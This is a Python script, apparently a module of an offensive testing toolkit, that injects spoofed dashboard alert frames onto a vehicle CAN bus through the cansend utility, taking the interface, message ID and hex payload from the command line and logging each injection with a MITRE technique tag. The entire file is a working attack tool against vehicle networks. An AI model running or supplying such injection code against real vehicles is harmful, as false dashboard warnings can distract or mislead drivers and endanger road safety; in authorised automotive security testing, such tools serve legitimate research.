#!/usr/bin/env python3
# modules/attacks/vehicle_dashboard_injector.py

import os
import argparse
import json
import subprocess
from datetime import datetime

LOG_FILE = "results/dashboard_injection_log.json"
MITRE_TTP = "T1496"

def log_injection(msg_id, payload_hex):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "can_id": msg_id,
        "payload": payload_hex,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def inject_dashboard_warning(can_if, msg_id, payload_hex):
    try:
        subprocess.run([
            "cansend", can_if, f"{msg_id}#{payload_hex}"
        ], check=True)
        log_injection(msg_id, payload_hex)
        print(f"[✓] Injected CAN frame: {msg_id}#{payload_hex}")
    except Exception as e:
        print(f"[!] Injection failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Inject spoofed dashboard alerts via CAN")
    parser.add_argument("--interface", default="can0", help="CAN interface (default: can0)")
    parser.add_argument("--id", required=True, help="CAN message ID (e.g. 123)")
    parser.add_argument("--payload", required=True, help="Payload in hex (e.g. FF00000000)")
    args = parser.parse_args()
    inject_dashboard_warning(args.interface, args.id, args.payload)
